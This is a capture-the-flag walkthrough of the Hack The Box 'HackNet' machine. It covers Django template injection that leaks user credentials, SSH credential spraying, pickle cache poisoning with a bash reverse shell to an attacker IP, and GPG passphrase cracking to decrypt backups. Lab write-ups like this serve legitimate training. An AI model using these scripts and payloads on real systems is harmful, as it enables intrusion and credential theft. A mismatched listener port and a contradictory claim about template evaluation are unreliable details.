---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# HackNet Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the_ **HackNet** _machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### About Machine <a href="#id-85be" id="id-85be"></a>

`HackNet` is a medium-difficulty Linux machine that features a hacker-themed social networking site built with Django. By registering an account and enumerating site functionality, we can identify a Server-Side Template Injection (SSTI) flaw in the likes widget and abuse it to enumerate template context variables. Using a small script to automate payload testing, we leak sensitive user data (emails and passwords) from the users who liked a post, allowing us to obtain valid SSH credentials and gain an initial foothold. For privilege escalation, the box highlights a weakness in Django’s FileBasedCache mechanism that allows cache poisoning via Pickle deserialization, then pivots to GPG key/passphrase recovery to decrypt database backups and ultimately obtain root access.

### Machine Info <a href="#b728" id="b728"></a>

* **Machine Name:** HackNet
* **Machine OS:** Linux
* **Difficulty:** Medium
* Machine Link: \[[https://app.hackthebox.com/machines/HackNet](https://app.hackthebox.com/machines/HackNet)]

### Initial Scanning: <a href="#b884" id="b884"></a>

```bash
nmap -p- -A -sC -sV -vv --min-rate 10000 10.10.11.85 -oN NmapScan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ8BFa2rPKTgVLDq1GN85n/cGWndJ63dTBCsAS6v3n8j85AwatuF1UE+C95eEdeMPbZ1t26HrjltEg2Dj+1A2DM=
|   256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFOSA3zBloIJP6JRvvREkPtPv013BYN+NNzn3kcJj0cH
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://hacknet.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/13%OT=22%CT=1%CU=38381%PV=Y%DS=2%DC=T%G=Y%TM=68ECE1
OS:B3%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST
OS:11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Uptime guess: 12.449 days (since Wed Oct  1 06:09:08 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   65.06 ms 10.10.14.1
2   65.08 ms 10.10.11.85
```

Add the domain `hacknet.htb` to `/etc/hosts` file:

```bash
sudo echo "10.10.11.85 hacknet.htb" | sudo tee -a /etc/hosts
```

### Enumerate Port 80: <a href="#ba36" id="ba36"></a>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*T-ukGdXBJIouT8IidLqb5w.png" alt="" height="244" width="700"><figcaption></figcaption></figure>

Register/Sing up a new account:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*-whB-LqYC6QgzgVnR6yj2A.png" alt="" height="241" width="700"><figcaption></figcaption></figure>

After register a new account try to log in using the account:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*hdYWT1yC7mdgWULZ1xVCIw.png" alt="" height="253" width="700"><figcaption></figcaption></figure>

And we see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*UleCxEzVAvqV-HqZ2Od98A.png" alt="" height="297" width="700"><figcaption></figcaption></figure>

we can do the following:

* Profile editing (name, signature, avatar)
* Creating posts
* Liking/unliking posts
* Messaging

By looking into wappalyzer we can see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*TgUfrtLx-TH_3N1OLM1UZg.png" alt="" height="305" width="700"><figcaption></figcaption></figure>

After many research we notice that it is a Python language environment, file uploads are not considered here, the first thing we consider is SSTI template injection. It is worth noting here that Django is different from the traditional Jinja2, under **the Django default template (DTL):**

* If we writing `{{7*7}}`,`{{os.environ}}`, `{{().__class__}},`it will be executed. Means, DTL only parses **variables that exist in the context** and has no arithmetic or system call capabilities.
* Only context variables can be rendered like, `{{ user }}`,`{{ request }}`,`{{ settings.DEBUG }}..`
* **Jinja2** or another template engine that allows Python expressions to be executed.
* In pure DTL, only **variable content** can be leaked, and cannot execute commands, access to content outside the system environment or database

So, we first change our user name to `{{ users }}`.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*qy8BbN4-n41i2m73E71abg.png" alt="" height="231" width="700"><figcaption></figcaption></figure>

Then go to search -> Open any other profile post.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*I--TmREloXjHCdkspFVgKw.png" alt="" height="186" width="700"><figcaption></figcaption></figure>

Open Inspect .

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*C1XrCelgJ5eRompBqkeE8g.png" alt="" height="267" width="700"><figcaption></figcaption></figure>

Then go to Network:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*ibxepOxtuqx4A7HxtAK_Cg.png" alt="" height="270" width="700"><figcaption></figcaption></figure>

Like any post and click on view likes:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*sFAkS7FIJl6k9VgeK3V1Zw.png" alt="" height="236" width="700"><figcaption></figcaption></figure>

Select one of the request and copy the URL:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*t9JgmG_VnBrS2R4d1sBUjg.png" alt="" height="140" width="700"><figcaption></figcaption></figure>

Open new tab and open the URL’s Source code and we observe this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*181rrCFHWWvGCGIwaaXNJA.png" alt="" height="89" width="700"><figcaption></figcaption></figure>

We can see that this is **a user list (QuerySet),** each element is a `SocialUser`Objects.

### **Extract full user data:** <a href="#id-20dd" id="id-20dd"></a>

Now again change the username to `{{ users.values }}.`

And Repeat the same, like any post → View like ..

Then Select one of the request and copy the URL and Open new tab and open the URL’s Source code and we see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XBL2zLtVzjO6zTsTRqHwSw.png" alt="" height="270" width="700"><figcaption></figcaption></figure>

Now we try to extract all Credential by using a automated script. We use this script:

```python
# Cred_extractor.py
import re, requests, html

BASE='http://hacknet.htb'
HEADERS={'Cookie':'csrftoken=YOUR_CSRF; sessionid=YOUR_SESSION'}
found=set()

for post_id in range(1,31):
    # Like the post to trigger the likes view
    requests.get(f"{BASE}/like/{post_id}", headers=HEADERS)
    r=requests.get(f"{BASE}/likes/{post_id}", headers=HEADERS)

    # Extract image titles containing QuerySet dump
    titles=re.findall(r'<img [^>]*title="([^"]*)"', r.text)
    if not titles: continue
    last=html.unescape(titles[-1])

    # Extract emails and passwords
    emails=re.findall(r"'email': '([^']*)'", last)
    pwds=re.findall(r"'password': '([^']*)'", last)
    for e,p in zip(emails,pwds):
        found.add(f"{e.split('@')[0]}:{p}")

print('\n'.join(sorted(found)))
```

Run:

```bash
chmod +x Cred_extractor.py
python3 Cred_extractor.py
```

And we get this:

<figure><img src="https://miro.medium.com/v2/resize:fit:386/1*UZ001Q_d6v1HZ0AFpQw6VA.png" alt="" height="476" width="386"><figcaption></figcaption></figure>

Now we use valid credentials by using Hydra:

```bash
hydra -C credlist.txt hacknet.htb ssh -I
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9HdMy5f4Blej4NzThrT1wQ.png" alt="" height="143" width="700"><figcaption></figcaption></figure>

Now Login with the credential and we get user flag:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mc5MwauLkHlVvODSNnjL1w.png" alt="" height="493" width="700"><figcaption></figcaption></figure>

After many research for PrivEsc we found in the website directory`/var/www/HackNet/SocialNetwork/views.py.`

Take a look at it separately and find the following part of the source code:

```bash
from django.shortcuts import render, redirect
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import get_object_or_404
from django.db.models.functions import Lower
from django.template import engines
from math import ceil
from PIL import Image
from django.utils.html import escape
from django.views.decorators.cache import cache_page

from .models import SocialUser, SocialArticle, SocialComment, ContactRequest, SocialMessage
from .news_generator import get_news

def index(request):
    if "email" in request.session.keys():
        return redirect("profile")

    return render(request, "SocialNetwork/index.html")

def login(request):
    if "email" in request.session.keys():
        return redirect("profile")

    message_error = ""

    if request.method == "POST":
        soc_user = SocialUser.objects.filter(email=request.POST['email']).first()

        if soc_user:
            if soc_user.password == request.POST['password']:
                request.session['email'] = soc_user.email
                request.session['requests'] = soc_user.contact_requests
                request.session['messages'] = soc_user.unread_messages
                return redirect("profile")
            else:
                message_error = "Bad credentials"
        else:
            message_error = "Bad credentials"

    context = {"message_error": message_error}

    return render(request, "SocialNetwork/login.html", context)

def register(request):
    if "email" in request.session.keys():
        return redirect("profile")

    message_error = ""

    if request.method == "POST":
        if not SocialUser.objects.filter(username=request.POST['username']) and not SocialUser.objects.filter(email=request.POST['email']):
            soc_user = SocialUser(email=escape(request.POST['email']), username=escape(request.POST['username']), password=request.POST['password'])
            soc_user.save()
            message_error = "User created"
        else:
            message_error = "The username or email address is already in use"

    context = {"message_error": message_error}

    return render(request, "SocialNetwork/register.html", context)

def contacts(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages
    list_len = 0

    if "action" in request.GET.keys():
        if request.GET['action'] == "request":
            to_user = get_object_or_404(SocialUser, pk=request.GET['userId'])

            if session_user in to_user.contacts.all():
                return redirect(request.META.get('HTTP_REFERER', '/'))
            if ContactRequest.objects.filter(from_user=session_user, to_user=to_user).first():
                return redirect(request.META.get('HTTP_REFERER', '/'))

            new_request = ContactRequest(from_user=session_user, to_user=to_user)
            new_request.save()

            to_user.contact_requests += 1
            to_user.save()

            return redirect(request.META.get('HTTP_REFERER', '/'))

        elif request.GET['action'] == "accept":
            if "userId" in request.GET.keys():
                request_from = get_object_or_404(SocialUser, pk=request.GET['userId'])
                contact_request = get_object_or_404(ContactRequest, from_user=request_from, to_user=session_user)

                session_user.contacts.add(request_from)
                session_user.contact_requests -= 1
                session_user.save()

                request_from.contacts.add(session_user)
                request_from.save()

                contact_request.delete()

                return redirect(request.META.get('HTTP_REFERER', '/'))
        elif request.GET['action'] == "decline":
            if "userId" in request.GET.keys():
                request_from = get_object_or_404(SocialUser, pk=request.GET['userId'])
                contact_request = get_object_or_404(ContactRequest, from_user=request_from, to_user=session_user)

                session_user.contact_requests -= 1
                session_user.save()

                contact_request.delete()
                return redirect(request.META.get('HTTP_REFERER', '/'))
        elif request.GET['action'] == "delete":
            if "userId" in request.GET.keys():
                user_to_delete = get_object_or_404(SocialUser, pk=request.GET['userId'])

                session_user.contacts.filter(username=user_to_delete).delete()
                session_user.save()
                user_to_delete.contacts.filter(username=session_user).delete()
                user_to_delete.save()

                return redirect(request.META.get('HTTP_REFERER', '/'))
    else:
        contact_list = list(session_user.contacts.all())
        list_len = len(contact_list)
        request_list = list(ContactRequest.objects.filter(to_user=session_user))

    news = get_news()
    context = {"news": news, "contact_list": contact_list, "request_list": request_list, "list_len": list_len}

    return render(request, "SocialNetwork/contacts.html", context)

def messages(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    if "tab" in request.GET.keys() and request.GET['tab'] == "sent":
        message_list = SocialMessage.objects.filter(from_user=session_user).order_by("-date")
    else:
        message_list = SocialMessage.objects.filter(to_user=session_user).order_by("-date")

    for single_message in message_list:
        if len(single_message.text) > 50:
            single_message.text = single_message.text[:50] + "..."

    news = get_news()

    context = {"message_list": message_list, "news": news}

    return render(request, "SocialNetwork/messages.html", context)

def message_detail(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    message = get_object_or_404(SocialMessage, pk=pk)

    if message.from_user != session_user and message.to_user != session_user:
        return redirect('messages')

    if not message.is_read and message.from_user != session_user:
        session_user.unread_messages -= 1
        session_user.save()
        message.is_read = True
        message.save()

    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    news = get_news()

    context = {"message": message, "news": news}

    return render(request, "SocialNetwork/message_detail.html", context)

def send_message(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    to_user = get_object_or_404(SocialUser, pk=pk)

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    if to_user.is_hidden and not session_user.two_fa:
        return redirect('messages')

    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    message_error = ""

    if request.method == "POST":
        new_message = SocialMessage(to_user=to_user, from_user=session_user, text=request.POST['message'])
        new_message.save()
        to_user.unread_messages += 1
        to_user.save()
        message_error = "Message has been sent"

    news = get_news()

    context = {"to_user": to_user, "message_error": message_error, "news": news}

    return render(request, "SocialNetwork/send_message.html", context)

def profile(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session["email"])
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages
    news = get_news()
    posts = SocialArticle.objects.filter(author=session_user).order_by("-date")

    for post in posts:
        if session_user in post.likes.all():
            post.is_like = True
        for like in post.likes.all():
            if like.is_hidden and like != session_user:
                post.likes_number -= 1

    context = {"user": session_user, "news": news, "posts": posts}

    return render(request, "SocialNetwork/profile.html", context)

def profile_detail(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    posts = {}

    user = get_object_or_404(SocialUser, pk=pk)

    session_user = get_object_or_404(SocialUser,email=request.session['email'])

    if user.is_hidden and user != session_user and not session_user.two_fa:
        return redirect('profile')

    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    if user == session_user:
        return redirect ('profile')

    posts = SocialArticle.objects.filter(author=user).order_by("-date")

    for post in posts:
        if session_user in post.likes.all():
            post.is_like = True
        for like in post.likes.all():
            if like.is_hidden and like != session_user:
                post.likes_number -= 1

    news = get_news()
    is_request = ContactRequest.objects.filter(from_user=session_user, to_user=user)
    have_request = ContactRequest.objects.filter(from_user=user, to_user=session_user)

    if user in session_user.contacts.all():
        is_contact = True
    else:
        is_contact = False

    context = {"user": user, "news": news, "posts": posts, "is_request": is_request, "have_request": have_request, "is_contact": is_contact}

    return render(request, "SocialNetwork/profile_detail.html", context)

def profile_edit(request):
    if not "email" in request.session.keys():
        return redirect("index")

    message_error = ""
    news = get_news()

    MAX_FILE_SIZE = 2 * 1024 * 1024  # 2 MB

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    if request.method == "POST":
        if session_user.two_fa:
            message_error = "Please confirm the changes by email"
        else:
            if request.FILES:
                uploaded_file = request.FILES['picture']

                if uploaded_file.size > MAX_FILE_SIZE:
                    message_error = "File too large (max 2MB)"
                    context = {"user": get_object_or_404(SocialUser, email=request.session['email']), "message_error": message_error, "news": news}    
                    return render(request, "SocialNetwork/profile_edit.html", context)

                try:
                    img = Image.open(uploaded_file)
                    img.verify()
                    uploaded_file.seek(0)
                    img = Image.open(uploaded_file)

                    # Image.open(request.FILES['picture'])
                    session_user.picture = request.FILES['picture']

                except:
                    message_error = "Bad picture"
                    context = {"user": get_object_or_404(SocialUser, email=request.session['email']), "message_error": message_error, "news": news}
                    return render(request, "SocialNetwork/profile_edit.html", context)
            if request.POST['username']:
                if not SocialUser.objects.filter(username=request.POST['username']):
                    session_user.username = request.POST['username']
                else:
                    message_error = "User exists"
                    context = {"user": get_object_or_404(SocialUser, email=request.session['email']), "message_error": message_error, "news": news}
                    return render(request, "SocialNetwork/profile_edit.html", context)
            if request.POST['password']:
                session_user.password = request.POST['password']
            if "is_public" in request.POST.keys():
                session_user.is_public = True
            else:
                session_user.is_public = False
            if request.POST['email']:
                if not SocialUser.objects.filter(email=request.POST['email']):
                    session_user.email = request.POST['email']
                else:
                    message_error = "Email exists"
                    context = {"user": get_object_or_404(SocialUser, email=request.session['email']), "message_error": message_error, "news": news}
                    return render(request, "SocialNetwork/profile_edit.html", context)

            session_user.about = request.POST['about']
            session_user.save()

            request.session['email'] = session_user.email
            message_error = "Profile updated"

    context = {"user": session_user, "message_error": message_error, "news": news}

    return render(request, "SocialNetwork/profile_edit.html", context)

def post(request):
    if not "email" in request.session.keys():
        return redirect("index")

    if request.method != "POST":
        return redirect("profile")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    article = SocialArticle(author=session_user, text=request.POST['text'])
    article.save()

    return redirect('profile')

def post_delete(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    article = get_object_or_404(SocialArticle, pk=pk)

    if article.author == session_user:
        article.delete()

    return redirect('profile')

def like(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    post = get_object_or_404(SocialArticle, pk=pk)
    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    if post.author.is_hidden and post.author != session_user:
        return redirect('profile')

    if post.likes.filter(username=session_user).exists():
        post.likes.remove(session_user)
        post.likes_number -= 1
    else:
        post.likes.add(session_user)
        post.likes_number += 1

    post.save()

    return HttpResponse("Success")

def likes(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    post = get_object_or_404(SocialArticle,pk=pk)
    users = post.likes.all()

    engine = engines["django"]
    template_string = ""

    context = {"users": users}

    for user in users:
        if not user.is_hidden or user == session_user:
            template_string += "<div class=\"likes-review-item\"><a href=\"/profile/"+str(user.pk)+"\"><img src=\""+user.picture.url+"\" title=\""+user.username+"\"></a></div>"

    try:
        template = engine.from_string(template_string)
    except:
        template = engine.from_string("<div class=\"likes-review-item\"><a>Something went wrong...</a></div>")

    return HttpResponse(template.render(context, request))

@csrf_exempt
def comment(request):
    if not "email" in request.session.keys():
        return redirect("index")

    if request.method != "POST":
        return redirect("profile")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    article = get_object_or_404(SocialArticle, pk=request.POST['article'])

    if article.author.is_hidden and article.author != session_user:
        return redirect('profile')

    context = {}

    try:
        if session_user in article.author.contacts.all() or session_user == article.author:
            new_comment = SocialComment(author=session_user, article=article, text=escape(request.POST['text']))

            post = get_object_or_404(SocialArticle, pk=request.POST['article'])
            post.comments_number += 1

            engine = engines["django"]
            template = engine.from_string("<div class=\"comment-item\"><div class=\"comment-item-left\"><img src=\"{{ new_comment.author.picture.url }}\"></div><div class=\"comment-item-right\"><a href=\"/profile/{{ new_comment.author.pk }}\"><h4>{{ new_comment.author.username }}</h4></a><span>{{ new_comment.text }}</span></div></div><div class=\"comment-item-date\"><a class=\"comment-delete\" href=\"/comment/delete/{{ new_comment.pk }}\"><img src=\"/static/delete.png\"> Delete</a> {{ new_comment.date }}</div>")

            new_comment.save()
            post.save()
            context = {"new_comment": new_comment}
        else:
            engine = engines["django"]
            template = engine.from_string("<div class=\"comment-item\"><p class=\"com-wrn\">You cannot comment on this post. Please add this user to your contacts to be able to do this.</p></div>")
    except:
        engine = engines["django"]
        template = engine.from_string("<div class=\"comment-item\"><p class=\"com-wrn\">HACKING ATTEMPT!</p></div>")

    return HttpResponse(template.render(context, request))

def comment_delete(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    user_comment = get_object_or_404(SocialComment, pk=pk)

    if user_comment.author == session_user:
        article = get_object_or_404(SocialArticle, pk=user_comment.article.pk)
        article.comments_number -= 1
        article.save()
        user_comment.delete()

    return redirect(request.META.get('HTTP_REFERER', '/'))

def comments(request, pk):
    if not "email" in request.session.keys():
        return redirect("index")

    post = get_object_or_404(SocialArticle, pk=pk)
    comments = SocialComment.objects.filter(article=post).order_by("-date")

    engine = engines["django"]
    template_string = ""
    context = {"comments": comments}

    try:
        template_string = "{% for single_comment in comments %}{% if not single_comment.author.is_hidden or single_comment.author.email == request.session.email %}<div class=\"comment-item\"><div class=\"comment-item-left\"><img src=\"{{ single_comment.author.picture.url }}\"></div><div class=\"comment-item-right\"><a href=\"/profile/{{ single_comment.author.pk }}\"><h4>{{ single_comment.author.username }}</h4></a><span>{{ single_comment.text }}</span></div></div><div class=\"comment-item-date\">{% if single_comment.author.email == request.session.email %}<a class=\"comment-delete\" href=\"/comment/delete/{{ single_comment.pk }}\"><img src=\"/static/delete.png\"> Delete</a>{% endif %} {{ single_comment.date }}</div>{% endif %}{% endfor %}"
        template = engine.from_string(template_string)
    except:
        template = engine.from_string("<div class=\"comment-item\"><p class=\"com-wrn\">Something went wrong...</p></div>")

    return HttpResponse(template.render(context, request))

@cache_page(60)
def explore(request):
    if not "email" in request.session.keys():
        return redirect("index")

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    page_size = 10
    keyword = ""

    if "keyword" in request.GET.keys():
        keyword = request.GET['keyword']
        posts = SocialArticle.objects.filter(text__contains=keyword).order_by("-date")
    else:
        posts = SocialArticle.objects.all().order_by("-date")

    pages = ceil(len(posts) / page_size)

    if "page" in request.GET.keys() and int(request.GET['page']) > 0:
        post_start = int(request.GET['page'])*page_size-page_size
        post_end = post_start + page_size
        posts_slice = posts[post_start:post_end]
    else:
        posts_slice = posts[:page_size]

    news = get_news()
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    for post_item in posts:
        if session_user in post_item.likes.all():
            post_item.is_like = True

    posts_filtered = []
    for post in posts_slice:
        if not post.author.is_hidden or post.author == session_user:
            posts_filtered.append(post)
        for like in post.likes.all():
            if like.is_hidden and like != session_user:
                post.likes_number -= 1

    context = {"pages": pages, "posts": posts_filtered, "keyword": keyword, "news": news, "session_user": session_user}

    return render(request, "SocialNetwork/explore.html", context)

def search(request):
    if not "email" in request.session.keys():
        return redirect("index")

    page_size = 10

    session_user = get_object_or_404(SocialUser, email=request.session['email'])

    if "username" in request.GET.keys():
        username = request.GET['username']
        users = SocialUser.objects.filter(username__contains=username).order_by(Lower("username"))
    else:
        users = SocialUser.objects.all().order_by(Lower("username"))
        username = ""

    pages = ceil(len(users) / page_size)

    if "page" in request.GET.keys() and int(request.GET['page']) > 0:
        user_start = int(request.GET['page'])*page_size-page_size
        user_end = user_start + page_size
        users_slice = users[user_start:user_end]
    else:
        users_slice = users[:page_size]

    for user in users_slice:
        if len(user.about) > 100:
            user.about = user.about[:100] + "..."

    users_filtered = []

    for user in users_slice:
        if not user.is_hidden or user == session_user:
            users_filtered.append(user)

    news = get_news()
    session_user = get_object_or_404(SocialUser, email=request.session['email'])
    request.session['requests'] = session_user.contact_requests
    request.session['messages'] = session_user.unread_messages

    context = {"pages": pages, "users": users_filtered, "username": username, "news": news}

    return render(request, "SocialNetwork/search.html", context)

def logout(request):
    if "email" in request.session.keys():
        del request.session['email']
        del request.session['requests']
        del request.session['messages']

    return redirect("index")
```

After many analysis with the source code and the system we can see that the system is vulnerable RCE via Django `FileBasedCache` poisoning (Pickle RCE).

See this Article for more information about Python Pickle: \[[https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)]

The app cached the `/explore` view for 60s and used Django's `FileBasedCache` stored in `/var/tmp/django_cache`. The directory was world-writable (`drwxrwxrwx`) and owned by `sandy:www-data`.

On disk Django file cache entries are stored as `'<ABSOLUTE_UNIX_EPOCH>\n' + pickle.dumps(value)`. The server reads these files back and unpickles them — giving an opportunity for code execution if we can write a crafted pickle with a valid header

**Check caching:**

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*owIw_APskcaCOC3VhJ9DgA.png" alt="" height="364" width="700"><figcaption></figcaption></figure>

We use this script to Create malicious pickle:

```python
# cache_poison.py
import pickle, os

cache_dir='/var/tmp/django_cache'
cmd="bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"
class RCE:
    def __reduce__(self): return (os.system, (cmd,))
pickle_payload=pickle.dumps(RCE())

# Poison all cache files
for file in os.listdir(cache_dir):
    if file.endswith('.djcache'):
        path=os.path.join(cache_dir,file)
        with open(path,'wb') as f:
            f.write(pickle_payload)
        print(f"[+] Poisoned {file}")
```

So, first we go to the `/var/tmp/django_cache` directory and upload the malicious pickle file (`cache_poison.py`) here and then run the file:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*yWB_8PlqQf7lWQ6_yGM8ow.png" alt="" height="188" width="700"><figcaption></figcaption></figure>

Then Run Netcat Listener on another terminal:

```bash
nc -lnvp 4242
```

Open web browser and browse this:

```
http://hacknet.htb/explore
```

And we successfully get RCE of sandy user.

<figure><img src="https://miro.medium.com/v2/resize:fit:673/1*VYvkW0UoiuwHPNPnwp-jCg.png" alt="" height="191" width="673"><figcaption></figcaption></figure>

Next after many research we found this from sandy’s home directory:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6uo5_DSZ9ww_CxV2OdIfbg.png" alt="" height="158" width="700"><figcaption></figcaption></figure>

Full Path:

```bash
/home/sandy/.gnupg/private-keys-v1.d/armored_key.asc
```

Now copy this file to our local machine by using python server.

Now try to crack the key passphrase:

```bash
gpg2john armored_key.asc > gpg_hash.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:388/1*9JPSstTpya3c49rwowMzCg.png" alt="" height="120" width="388"><figcaption></figcaption></figure>

```bash
john gpg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*gRdLnQKrB6SZ-cp9fLrFGQ.png" alt="" height="161" width="700"><figcaption></figcaption></figure>

Now Create batch decryption script to retrieve decrypted files:

```bash
#!/bin/bash
KEY_PATH="/home/sandy/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="DISCOVERED_PASSPHRASE"
gpg --import "$KEY_PATH"
for file in "$BACKUP_DIR"/*.gpg; do
    [ -f "$file" ] || continue
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/${filename}.sql"
    echo "[*] Decrypting $file → $outpath"
    gpg --batch --yes --passphrase "$PASSPHRASE" --pinentry-mode loopback -o "$outpath" -d "$file"
done
echo "[+] Decryption complete. Files in $OUTPUT_DIR"
```

Run script and retrieve decrypted files:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*xJBPqPsO188bjExWI72KiQ.png" alt="" height="314" width="700"><figcaption></figcaption></figure>

Now go to `/tmp` directory and download the output files in local machine and search string to find password:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*QHL8CMs5ALF9gSpx2JyOug.png" alt="" height="253" width="700"><figcaption></figcaption></figure>

We get a Password now try to switch root and we successfully get root flag:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*6uwKKGAbnMcdS8d4OgFyNw.png" alt="" height="208" width="700"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-1106" id="id-1106"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
